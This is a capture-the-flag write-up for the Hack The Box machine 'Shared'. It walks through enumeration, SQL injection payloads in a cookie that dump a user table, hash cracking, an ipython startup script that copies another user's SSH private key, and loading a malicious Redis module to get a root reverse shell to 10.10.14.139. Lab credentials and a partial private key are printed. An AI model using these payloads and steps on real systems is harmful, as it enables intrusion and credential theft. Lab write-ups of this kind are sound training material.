![shared.png](shared.png)

# Shared

## Enum
```bash
nmap -sC -sV shared.htb -oN nmap.initial
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-16 20:39 IST
Nmap scan report for shared.htb (10.10.11.172)
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-robots.txt: 81 disallowed entries (15 shown)
| /*?order= /*?tag= /*?id_currency= /*?search_query=
| /*?back= /*?n= /*&order= /*&tag= /*&id_currency=
| /*&search_query= /*&back= /*&n= /*controller=addresses
|_/*controller=address /*controller=authentication
|_http-title: Did not follow redirect to https://shared.htb/
443/tcp open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
|_http-server-header: nginx/1.18.0
| tls-alpn:
|   h2
|_  http/1.1
| http-robots.txt: 81 disallowed entries (15 shown)
| /*?order= /*?tag= /*?id_currency= /*?search_query=
| /*?back= /*?n= /*&order= /*&tag= /*&id_currency=
| /*&search_query= /*&back= /*&n= /*controller=addresses
|_/*controller=address /*controller=authentication
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Shared Shop
|_Requested resource was https://shared.htb/index.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.38 seconds
zsh: segmentation fault  nmap -sC -sV shared.htb -oN nmap.initial
```

The tls cert has a wildcard for subdomains of shared.htb, so it's worth enumerating vhosts  
```bash
gobuster vhost -u shared.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shared.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/namelist.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/10/16 20:40:50 Starting gobuster in VHOST enumeration mode
===============================================================
Found: checkout.shared.htb (Status: 200) [Size: 3229]
Progress: 24281 / 151266 (16.05%)                   ^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2022/10/16 20:44:16 Finished
===============================================================
```

Found checkout.shared.htb adding both in our hosts file
```bash
whatweb http://shared.htb
http://shared.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/], nginx[1.18.0]
https://shared.htb/ [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/index.php], nginx[1.18.0]
https://shared.htb/index.php [200 OK] Cookies[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], IP[10.10.11.172], JQuery, Open-Graph-Protocol[website], PoweredBy[PrestaShop], PrestaShop[EN], Script[application/ld+json,text/javascript], Title[Shared Shop], X-UA-Compatible[ie=edge], nginx[1.18.0]
```

The PHP session Cookies say prestashop

Dirbusting found quite a lot of 403 401 and so on, but the 200 are : 
```bash
[20:40:28] 200 -    5KB - /INSTALL.txt
[20:40:31] 200 -   88B  - /Makefile
[20:44:06] 200 -  411KB - /composer.lock
[20:48:01] 200 -    3KB - /robots.txt
```

```
                                         *#&&&&&&&&&&&&.
                                    #&&&&&&&&&&&&&&&&&&&&&&&&&(
                                *&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*
                              &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
                           ,&&&&&&&&&&&&&&&&&&&%%#%%%&&&&&&&&&&&&&&&&&&
                          &&&&&&&&&&&&&*****************#&&&&&&&&&&&&&&
                        (&&&&&&&&&&&&*************************&&&&&&&&&&&&(
                       &&&&&&&&&&&%*****************************%&&&&&&&&&&&
                      &&&&&&&&&&%*********************************%&&&&&&&&&&
                     %&&&&&&&&&(********,            *********,    /&&&&&&&&&%
                    *&&&&&&&&&/*******.     .*(((/.    ******   /#* *&&&&&&&&&*
                    &&&&&&&&&(*******  /%%%%%%%%%%%&&&&%,*** *&&&&&&%/&&&&&&&&&
                   *&&&&&&&&%*******/%%%%%%%%%%%%%((&&&&&%#*&&&&&&&&%%%&&&&&&&&
                   &&&&&&&&&/*****(%%%%%%%%%%%%%%#((%&&&&%%%*&&&&&&&(%%&&&&&&&&&
                   &&&&&&&&&*****%%%%%%%%%%%%%#/, @@ %&&%%%%#**&&&&/#%%&&&&&&&&&
                   &&&&&&&&&***&@@@@@@@@@@#/////      @@%%%% ****@@  *@&&&&&&&&&
                   &&&&&&&&&**%@@@@@@@@@@@@@@@@@@#  /@@@%%%  *****/@@@@&&&&&&&&&
                   #&&&&&&&*@@@@@@@@@@@@@@@@@@@@@@@@@%%#     *******@@&&&&&&&&&&
                    &&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@%%    *********(&&&&&&&&&
                    &&&&&&&&&&@@@@@@@@@@@@@@@&@@@@@@@%     ************%&&&&&&%
                     &&&&&&&&&&@@@@@@@@@@@@@@@@ (@@@.     **************(&&&&&
                      &&&&&&&&&&@@@@@@@@@@@@@@@@@,       ************,,%&&&&&
                       &&&&&&&&&&&@@@@@@@@@@@@@@@@@*     ,,,,,,,,,,,/&&&&&&&
                        &&&&&&&&&&&&@@@@@@@@@@@@@@@@     ,,,,,,,,(&&&&&&&&&
                         &&&&&&&&&(***(@@@@@@@@@@@@@@@#   .,****(&&&&&&&&&
                           &&&&%*****/(((**#@@@@@@@@@@@#**(((/*****%&&&&
                             %*******(((/                 /(((*******%
                               *****/#############((((((((((((/*****
                                   */#############((((((((((((/*
                                       ###########((((((((((



.......                              ...                 .****,    **
..   ,....                           ...                ***   **   **
..      .. ......  .......   ....... .....   .........  **.        **,*****.   *******   **.*****,
..     ... ...    ..     .. ...      ...   ...     ...   ******.   ***    ** ,**     **, ***    ***
.........  ...   ........     .....  ...   ..      ...        ***  **     ** **       ** **      **
..         ...    ...    .        .. ...   ,..     ...  *,     **  **     ** ***     *** ***    ,**
..         ...     .......  ,......   .....  .........  ********   **     **   *******   ** ******
                                                                                         **

             --- ===== Installation instructions for PrestaShop 1.7 ===== ---



=== Prerequirements

To install PrestaShop 1.7, you need a web server running PHP 7.1.3+ and any flavor of MySQL 5.5+ (MySQL, MariaDB, Percona Server, etc.).

You can find more information on our System requirements (https://devdocs.prestashop.com/1.7/basics/installation/system-requirements/) page and on the System Administrator Guide (https://doc.prestashop.com/display/PS16/System+Administrator+Guide).

=== Installing PrestaShop

Since you are reading this file, you have already downloaded the latest PrestaShop Zip archive and unzipped.

Here is the content of this archive:

* The prestashop.zip archive, which contains all the necessary files.
* The index.php file, which will automatically unzip the prestashop.zip archive for you.
* The Install_PrestaShop.html file, which redirects you to https://doc.prestashop.com/display/PS17/Installing+PrestaShop

From there on, follow these instructions:

1. Upload at least index.php and prestashop.zip on your web server.
2. From your web browser, go to the folder where index.php and prestashop.zip have been uploaded and browse index.php. The Zip archive should unzip automatically.
3. You are redirected to the PrestaShop installer. Follow the instructions.

After PrestaShop has successfuly been installed, delete the /install/ folder from your server.

Enjoy your store :)




Essential links about PrestaShop:

* User Guide: https://doc.prestashop.com/display/PS17/User+Guide
* Tech docs (modules & themes): https://devdocs.prestashop.com/
* Official blog: https://www.prestashop.com/en/blog
* Developer blog: https://build.prestashop.com/
* Get community support: https://www.prestashop.com/forums/
* Get paid support: https://www.prestashop.com/en/support
* Find modules and themes: https://addons.prestashop.com/
* Contribute with code: https://github.com/PrestaShop/PrestaShop
* Contribute with translation: https://crowdin.net/project/prestashop-official




                       PrestaShop - WeCommerce Is Better eCommerce

```

from the composer.lock
```json
        {
            "name": "prestashop/blockwishlist",
            "version": "v2.0.1",
            "source": {
                "type": "git",
                "url": "https://github.com/PrestaShop/blockwishlist.git",
                "reference": "51d527730ce58aac136aac37f624592696be6f9d"
            },
            "dist": {
                "type": "zip",
                "url": "https://api.github.com/repos/PrestaShop/blockwishlist/zipball/51d527730ce58aac136aac37f624592696be6f9d",
                "reference": "51d527730ce58aac136aac37f624592696be6f9d",
                "shasum": ""
            },
            "require-dev": {
                "prestashop/php-dev-tools": "~3.0"
            },
            "type": "prestashop-module",
            "autoload": {
                "psr-4": {
                    "PrestaShop\\Module\\BlockWishList\\": "src/"
                },
                "classmap": [
                    "blockwishlist.php",
                    "controllers",
                    "classes"
                ]
            },
            "notification-url": "https://packagist.org/downloads/",
            "license": [
                "AFL-3.0"
            ],
            "authors": [
                {
                    "name": "PrestaShop SA",
                    "email": "contact@prestashop.com"
                }
            ],
            "description": "PrestaShop module blockwishlist",
            "homepage": "https://github.com/PrestaShop/blockwishlist",
            "support": {
                "source": "https://github.com/PrestaShop/blockwishlist/tree/v2.0.1"
            },
            "time": "2021-05-27T15:29:15+00:00"
        },
```


So so far we have a lot of information, and a lot of noise but the things potentially worth investigating are :   
- PrestaShop 1.7
- PrestaShop blockwishlist 2.0.1 

## Blockwishlist sqli:
[https://www.cybersecurity-help.cz/vdb/SB2022072609](https://www.cybersecurity-help.cz/vdb/SB2022072609)  
[https://github.com/PrestaShop/blockwishlist/commit/b3ec4b85af5fd73f74d55390b226d221298ca084](https://github.com/PrestaShop/blockwishlist/commit/b3ec4b85af5fd73f74d55390b226d221298ca084)

According the the PR this was fixed in 2.1.1 so this might still be it: 
```bash
searchsploit blockwish
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
Prestashop blockwishlist module 2.1.0 - SQLi                             | php/webapps/51001.py
------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Making an account and starting to poke around with the wishlist, the actual cart in this implementation is sent to the checkout.shared.htb page through the `custom_cart` cookie, which we can tamper with.  
Once url decoded the cookie looks like this: 
```bash
{"7DA8SKYP":"1"}             # Normal cookie the id shows up in the checkout page under product
{"asdf":"1"}                 # If we set a value that we know to be false, we see Not Found under product 
{"asdf' or 1=1 -- -":"1"}    # we know asdf returns false so if injection is possible, this would be true, and it is (product 53GG2EF8)
```

Fit the query to the number of fields
```
{"asdf' union select 1 -- -":"1"}     # False 
{"asdf' union select 1,2 -- -":"1"}     # False
{"asdf' union select 1,2,3 -- -":"1"}     # True as there are 3 fields
{"asdf' union select 1,2,3,4 -- -":"1"}     # False
```

Use the product id field (2) to concatenate and dump all table names from the information schema
```
{"asdf' union select 1,(select group_concat(table_name separator '|') from information_schema.tables),3 -- -":"1"}
```
```bash
ALL_PLUGINS|APPLICABLE_ROLES|CHARACTER_SETS|CHECK_CONSTRAINTS|COLLATIONS|COLLATION_CHARACTER_SET_APPLICABILITY|COLUMNS|COLUMN_PRIVILEGES|ENABLED_ROLES|ENGINES|EVENTS|FILES|GLOBAL_STATUS|GLOBAL_VARIABLES|KEYWORDS|KEY_CACHES|KEY_COLUMN_USAGE|OPTIMIZER_TRACE|PARAMETERS|PARTITIONS|PLUGINS|PROCESSLIST|PROFILING|REFERENTIAL_CONSTRAINTS|ROUTINES|SCHEMATA|SCHEMA_PRIVILEGES|SESSION_STATUS|SESSION_VARIABLES|STATISTICS|SQL_FUNCTIONS|SYSTEM_VARIABLES|TABLES|TABLESPACES|TABLE_CONSTRAINTS|TABLE_PRIVILEGES|TRIGGERS|USER_PRIVILEGES|VIEWS|CLIENT_STATISTICS|INDEX_STATISTICS|INNODB_SYS_DATAFILES|GEOMETRY_COLUMNS|INNODB_SYS_TABLESTATS|SPATIAL_REF_SYS|INNODB_BUFFER_PAGE|INNODB_TRX|INNODB_CMP_PER_INDEX|INNODB_METRICS|INNODB_LOCK_WAITS|INNODB_CMP|THREAD_POOL_WAITS|INNODB_CMP_RESET|THREAD_POOL_QUEUES|TABLE_STATISTICS|INNODB_SYS_FIELDS|INNODB_BUFFER_PAGE_LRU|INNODB_LOCKS|INNODB_FT_INDEX_TABLE|INNODB_CMPMEM|THREAD_POOL_GROUPS|INNODB_CMP_PER_INDEX_RESET|INNODB_SYS_FOREIGN_COLS|INNODB_FT_INDEX_CACHE|INNODB_BUFFER_POOL_STATS|INNODB_FT_BEING_DELETED|INNODB_SYS_FOREIGN|INNODB_CMPMEM_RESET|INNODB_FT_DEFAULT_STOPWORD|INNODB_SYS_TABLES|INNODB_SYS_COLUMNS|INNODB_FT_CONFIG|USER_STATISTICS|INNODB_SYS_TABLESPACES|INNODB_SYS_VIRTUAL|INNODB_SYS_INDEXES|INNODB_SYS_SEMAPHORE_WAITS|INNODB_MUTEXES|user_variables|INNODB_TABLESPACES_ENCRYPTION|INNODB_FT_DELETED|THREAD_POOL_STATS|user|product
```

Do the same thing to get all columns for the user table
```
{"asdf' union select 1,(select group_concat(column_name separator '|') from information_schema.columns where table_name='user'),3-- -":"1"}
```
```sql
id|username|password
```

And finally dump the data we need
```
{"asdf' union select 1,(select group_concat(concat(username,'|',password) separator ';') from user),3-- -":"1"}
```
```sql
james_mason|fc895d4eddc2fc12f995e18c865cf273
```

## Hash Cracking 
Thats 32 hex so possibly MD5
```bash
printf 'fc895d4eddc2fc12f995e18c865cf273'|wc -c
32
```

Crackstation does it too, but here's how to do it with hashcat
```bash
hashcat -m 0 fc895d4eddc2fc12f995e18c865cf273 /usr/share/wordlists/rockyou.txt                                     1 ⨯
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-0x000, 2914/5893 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

fc895d4eddc2fc12f995e18c865cf273:Soleil101

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: fc895d4eddc2fc12f995e18c865cf273
Time.Started.....: Mon Oct 17 00:17:27 2022 (1 sec)
Time.Estimated...: Mon Oct 17 00:17:28 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6404.7 kH/s (0.10ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2091008/14344385 (14.58%)
Rejected.........: 0/2091008 (0.00%)
Restore.Point....: 2088960/14344385 (14.56%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: TEAMODARIO -> Smudge77

Started: Mon Oct 17 00:17:26 2022
Stopped: Mon Oct 17 00:17:29 2022
```
And this is a valid username:password for ssh


## Privesc from james to dan

Probing around to see what we can find, users with a shell are james root and dan, and the user flag is in dan
```bash
grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
james_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
```

There's the mysql we already looted and something on port 6379
```bash
netstat -tulpen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      106        13494      -
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      0          284021     -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          13447      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          12591      -
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      0          13448      -
tcp6       0      0 :::22                   :::*                    LISTEN      0          12593      -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          12476      -
```

That's a redis instance
```bash
grep 6379 /etc/services
redis           6379/tcp
```

We have already looted the MySQL database, but the password for it may be useful somewhere else
```bash
cat /var/www/checkout.shared.htb/config/db.php
<?php
define('DBHOST','localhost');
define('DBUSER','checkout');
define('DBPWD','a54$K_M4?DdT^HUk');
define('DBNAME','checkout');
?>
```

Running pspy64 there's a cronjob running /root/c.sh which does something with redis
```bash
2022/10/16 19:55:06 CMD: UID=0    PID=2137   | perl -ne s/\((\d+)\)/print " $1"/ge
2022/10/16 19:55:06 CMD: UID=0    PID=2136   | /bin/bash /root/c.sh
2022/10/16 19:55:06 CMD: UID=0    PID=2135   | /bin/bash /root/c.sh
2022/10/16 19:55:06 CMD: UID=0    PID=2138   | pidof redis-server
2022/10/16 19:55:06 CMD: UID=0    PID=2141   | /sbin/init
```

Another cronjob is killing ipython, moving to `/opt/scripts_review` and running ipython again
```bash
2022/10/16 19:56:01 CMD: UID=0    PID=2151   | /usr/sbin/CRON -f
2022/10/16 19:56:01 CMD: UID=1001 PID=2152   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
2022/10/16 19:56:01 CMD: UID=1001 PID=2153   | /usr/bin/python3 /usr/local/bin/ipython
```

There's a privesc for ipython as described here:  
[https://github.com/advisories/GHSA-pq7m-3gw7-gq5x](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x)  

So we can create a startup directory in there 
```bash
mkdir -m 777 /opt/scripts_review/profile_default 
mkdir -m 777 /opt/scripts_review/profile_default/startup
```

And drop a simple python script that will copy dan's key to tmp, as we have been able to observe that the .ssh folder exists for him
```python
#!/usr/bin/python3

with open("/home/dan_smith/.ssh/id_rsa", "r") as f:
    key = f.read()

with open("/tmp/dan_rsa", "w") as f:
    f.write(key)
```

```bash
cat dan_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO
+/+OPh0/KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZ
FwA4NCZouzAW1W/ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6ku
sjib5U7vdKXASeoPSHmWzFismokfYy8Oyupd8y1WXA4jczt9qKUgBetVUDiai1ckFBePWl
4G3yqQ2ghuHhDPBC+lCl3mMf1XJ7Jgm3sa+EuRPZFDCUiTCSxA8LsuYrWAwCtxJga31zWx
FHAVThRwfKb4Qh2l9rXGtK6G05+DXWj+OAe/Q34gCMgFG4h3mPw7tRz2plTRBQfgLcrvVD
oQtePOEc/XuVff+kQH7PU9J1c0F/hC7gbklm2bA8YTNlnCQ2Z2Z+HSzeEXD5rXtCA69F4E
u1FCodLROALNPgrAM4LgMbD3xaW5BqZWrm24uP/lAAAFiPY2n2r2Np9qAAAAB3NzaC1yc2
EAAAGBAL1hZMxEMPbrCJp2e2QM3n5t+K/ueAvb248pjZeKcMTST2jUh23Vjvv/jj4dPyoj
4O9BnWhVoYJvKhHxVyxF1G50jJIgeyWwt3wnwwhlGJqfUIokAtMYhXmkm72RcAODQmaLsw
FtVv2V3utC2gF1QJRCG7hjlXDa1X4fl8lwxbxMq3uQVjQEUEmq1eQhl5OpLrI4m+VO73Sl
...............................SNIP...................................
2AwUg3cT7kmKUdAvBHsj20uwv8a1ezFQNN5vxTnQPQLTiZoUIR7FDTOkQ0W3hfvjznKXTM
wictz9NZYWpEZQAuSX2QJgBJc1WNOtrgJscNauv7MOtZYclqKJShDd/NHUGPnNasHiPjtN
CRr7thGmZ6G9yEnXKkjZJ1Neh5Gfx31fQBaBd4XyVFsvUSphjNAAAAwQD4Yntc2zAbNSt6
GhNb4pHYwMTPwV4DoXDk+wIKmU7qs94cn4o33PAA7ClZ3ddVt9FTkqIrIkKQNXLQIVI7EY
Jg2H102ohz1lPWC9aLRFCDFz3bgBKluiS3N2SFbkGiQHZoT93qn612b+VOgX1qGjx1lZ/H
I152QStTwcFPlJ0Wu6YIBcEq4Rc+iFqqQDq0z0MWhOHYvpcsycXk/hIlUhJNpExIs7TUKU
SJyDK0JWt2oKPVhGA62iGGx2+cnGIoROcAAADBAMMvzNfUfamB1hdLrBS/9R+zEoOLUxbE
SENrA1qkplhN/wPta/wDX0v9hX9i+2ygYSicVp6CtXpd9KPsG0JvERiVNbwWxD3gXcm0BE
wMtlVDb4WN1SG5Cpyx9ZhkdU+t0gZ225YYNiyWob3IaZYWVkNkeijRD+ijEY4rN41hiHlW
HPDeHZn0yt8fTeFAm+Ny4+8+dLXMlZM5quPoa0zBbxzMZWpSI9E6j6rPWs2sJmBBEKVLQs
tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

Now as dan we have access to the sysadmin group
```bash
id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
```

And the only thing it gives access to is this 
```bash
find / -group sysadmin 2> /dev/null
/usr/local/bin/redis_connector_dev
```

That's a C binary, probaly what the other cronjob we observed earlier is triggering through `/root/c.sh`
```
file redis_connector_dev
redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
```

Lets exfiltrate it, and move it to an amd64 machine. Now we could  do some fancy binary reversing, but the filename literally says `redis_connector`, so it's a pretty safe assumption to make, that it will attempt to connect to redis. Lets try just kicking off the binary while listening on the redis port.
```bash
nc -lvnp 6379
listening on [any] 6379 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59976
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```

And sure enough that's the password
```bash
redis-cli
127.0.0.1:6379> info
NOAUTH Authentication required.
127.0.0.1:6379> auth F2WHqJUz2WEz=Gqq
OK
```

There's apparently no key value pairs in this redis instance, but we might still be able to use it as a Privilege escalation vector 
```bash
127.0.0.1:6379> KEYS *
(empty array)
```

[https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)  
[https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)  

Using the above we're building a redis module writen in C from an amd64 machine. And then loading it from the running redis instance. That module then lets us call system commands, or run a reverse shell. 
```bash
127.0.0.1:6379> module load /dev/shm/module.so
OK
127.0.0.1:6379> INFO modules
# Modules
module:name=system,ver=1,api=1,filters=0,usedby=[],using=[],options=[]
127.0.0.1:6379> auth F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> module load /dev/shm/module.so
OK
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.rev 10.10.14.139 4242
```

Catching the shell
```bash
rlwrap nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.139] from (UNKNOWN) [10.10.11.172] 33752
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/var/lib/redis
id
uid=0(root) gid=0(root) groups=0(root)
```

Notes on how to steer things around in redis-cli
```bash
redis-cli -h localhost -p 6379
redis-cli
INFO                 # if NOAUTH Authentication required, then auth is needed
AUTH password        # redis can be configured to have only a password
AUTH user password   # or both a username and a password
INFO keyspace        # equivalent to a show databases
SELECT 1             # select database 1
KEYS *               # List all keys in database 1

get key:1
set key:1 newvalue
del key:1

MODULE LOAD /path/to/mymodule.so  # load a module at runtime
```
